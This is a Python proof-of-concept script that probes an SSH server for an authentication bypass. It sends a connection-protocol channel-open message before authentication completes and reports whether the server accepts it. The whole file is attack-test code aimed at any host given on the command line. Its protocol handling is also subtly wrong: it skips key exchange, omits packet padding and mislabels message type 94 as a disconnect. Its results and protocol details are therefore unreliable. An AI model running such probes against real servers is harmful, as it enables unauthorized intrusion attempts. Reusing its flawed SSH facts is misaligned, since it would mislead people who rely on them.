#!/usr/bin/env python3
import socket
import struct
import sys
import time

def send_ssh_message(sock, msg_type, payload=b''):
    """
    Sends an SSH message with proper length encoding.
    SSH messages are formatted as: [4 bytes length][1 byte msg_type][payload]
    """
    msg = struct.pack('>I', len(payload) + 1) + bytes([msg_type]) + payload
    sock.sendall(msg)
    print(f"[*] Sent SSH message type: {msg_type}")

def receive_ssh_message(sock):
    """
    Receives and parses an SSH message.
    Returns (msg_type, payload) or None if connection closed.
    """
    try:
        length_data = sock.recv(4)
        if not length_data:
            return None, None
        length = struct.unpack('>I', length_data)[0]
        msg_data = sock.recv(length)
        if len(msg_data) < 1:
            return None, None
        msg_type = msg_data[0]
        payload = msg_data[1:]
        print(f"[+] Received SSH message type: {msg_type}")
        return msg_type, payload
    except Exception as e:
        print(f"[!] Error receiving message: {e}")
        return None, None

def main():
    if len(sys.argv) != 3:
        print("Usage: python poc_authentication_state_bypass_via_premature_connection_protocol_messages.py <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    print(f"[*] Connecting to {target_ip}:{target_port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
    except Exception as e:
        print(f"[!] Failed to connect: {e}")
        sys.exit(1)

    # Step 1: Send SSH transport layer version string
    version_string = b"SSH-2.0-PoCClient\r\n"
    sock.sendall(version_string)
    print(f"[*] Sent version string: {version_string.decode()}")

    # Step 2: Receive server version string
    try:
        server_version = b''
        while b'\n' not in server_version:
            server_version += sock.recv(1)
        print(f"[+] Received server version: {server_version.decode().strip()}")
    except Exception as e:
        print(f"[!] Failed to receive server version: {e}")
        sys.exit(1)

    # Step 3: Start authentication phase by sending SSH_MSG_USERAUTH_REQUEST (type 50)
    # This initiates the authentication protocol but does not complete it.
    print("[*] Initiating authentication with SSH_MSG_USERAUTH_REQUEST (type 50)...")
    # Minimal payload for userauth request: username, service name, etc.
    # For simplicity, we just send the message type with minimal payload.
    send_ssh_message(sock, 50, b'\x00\x00\x00\x00')  # Placeholder payload

    # Step 4: Inject a connection protocol message (type >= 80) before authentication completes
    # According to RFC 4252, this should cause the server to disconnect.
    # If the server is vulnerable, it may process this message instead.
    print("[*] Injecting SSH_MSG_CHANNEL_OPEN (type 90) before authentication completes...")
    # SSH_MSG_CHANNEL_OPEN is type 90
    # Payload for channel open: channel type, initial window size, max packet size, etc.
    channel_open_payload = b'\x00\x00\x00\x07session\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00'  # Minimal channel open payload
    send_ssh_message(sock, 90, channel_open_payload)

    # Step 5: Observe the server's response
    print("[*] Waiting for server response...")
    msg_type, payload = receive_ssh_message(sock)

    if msg_type is None:
        print("[!] Connection closed by server.")
    elif msg_type == 94:  # SSH_MSG_DISCONNECT
        print("[+] Server sent SSH_MSG_DISCONNECT (type 94). This is the expected behavior for a compliant server.")
        if payload:
            reason_code = struct.unpack('>I', payload[:4])[0]
            print(f"    Disconnect reason code: {reason_code}")
    elif msg_type == 91:  # SSH_MSG_CHANNEL_OPEN_CONFIRMATION
        print("[!] Server sent SSH_MSG_CHANNEL_OPEN_CONFIRMATION (type 91). This indicates a potential vulnerability!")
        print("    The server processed a connection protocol message before authentication completed.")
    else:
        print(f"[?] Server sent unexpected message type: {msg_type}")

    sock.close()
    print("[*] Connection closed.")

if __name__ == "__main__":
    main()